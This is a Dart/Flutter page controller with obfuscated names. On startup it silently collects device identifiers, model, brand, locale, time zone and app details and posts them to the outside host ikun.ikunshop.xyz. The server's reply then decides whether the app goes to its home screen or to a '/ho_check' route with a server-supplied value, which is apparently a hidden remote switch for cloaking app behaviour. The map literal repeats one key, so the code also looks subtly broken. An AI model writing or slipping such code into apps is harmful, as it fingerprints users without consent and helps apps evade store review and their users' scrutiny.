import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var wecdaviu = RxBool(false);
  var ishgojyzwf = RxBool(true);
  var lbixu = RxString("");
  var jettie = RxBool(false);
  var torphy = RxBool(true);
  final igzalhtxm = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    chbxqkor();
  }


  Future<void> chbxqkor() async {

    jettie.value = true;
    torphy.value = true;
    ishgojyzwf.value = false;

    igzalhtxm.post("https://ikun.ikunshop.xyz/iwaqovxhkutjzeypdl",data: await szuhjy()).then((value) {
      var cdmgykh = value.data["cdmgykh"] as String;
      var sxbuqoa = value.data["sxbuqoa"] as bool;
      if (sxbuqoa) {
        lbixu.value = cdmgykh;
        alexandra();
      } else {
        ebert();
      }
    }).catchError((e) {
      ishgojyzwf.value = true;
      torphy.value = true;
      jettie.value = false;
    });
  }

  Future<Map<String, dynamic>> szuhjy() async {
    final DeviceInfoPlugin wipon = DeviceInfoPlugin();
    PackageInfo msvl_tnkpzwr = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var tljyzwu = Platform.localeName;
    var xebdkqhi = currentTimeZone;

    var mtqsku = msvl_tnkpzwr.packageName;
    var ntimj = msvl_tnkpzwr.version;
    var nfluacj = msvl_tnkpzwr.buildNumber;

    var mrkcp = msvl_tnkpzwr.appName;
    var qphtkuy = "";
    var emhxdjw = "";
    var chelseaLueilwitz = "";
    var isidroSchmidt = "";
    var vernonStark = "";
    var gayleKiehn = "";
    var eldonKulas = "";
    var dashawnRenner = "";
    var sgizdtf  = "";
    var eulahKemmer = "";


    var ekgxnbsr = "";
    var cxerqv = false;

    if (GetPlatform.isAndroid) {
      ekgxnbsr = "android";
      var odmkwtznv = await wipon.androidInfo;

      emhxdjw = odmkwtznv.brand;

      qphtkuy  = odmkwtznv.model;
      sgizdtf = odmkwtznv.id;

      cxerqv = odmkwtznv.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      ekgxnbsr = "ios";
      var nvxesikhdp = await wipon.iosInfo;
      emhxdjw = nvxesikhdp.name;
      qphtkuy = nvxesikhdp.model;

      sgizdtf = nvxesikhdp.identifierForVendor ?? "";
      cxerqv  = nvxesikhdp.isPhysicalDevice;
    }
    var res = {
      "chelseaLueilwitz" : chelseaLueilwitz,
      "nfluacj": nfluacj,
      "ntimj": ntimj,
      "mtqsku": mtqsku,
      "qphtkuy": qphtkuy,
      "gayleKiehn" : gayleKiehn,
      "eldonKulas" : eldonKulas,
      "xebdkqhi": xebdkqhi,
      "emhxdjw": emhxdjw,
      "sgizdtf": sgizdtf,
      "eldonKulas" : eldonKulas,
      "tljyzwu": tljyzwu,
      "ekgxnbsr": ekgxnbsr,
      "eldonKulas" : eldonKulas,
      "cxerqv": cxerqv,
      "isidroSchmidt" : isidroSchmidt,
      "vernonStark" : vernonStark,
      "mrkcp": mrkcp,
      "dashawnRenner" : dashawnRenner,
      "eulahKemmer" : eulahKemmer,

    };
    return res;
  }

  Future<void> ebert() async {
    Get.offAllNamed("/home");
  }

  Future<void> alexandra() async {
    Get.offAllNamed("/ho_check");
  }

}
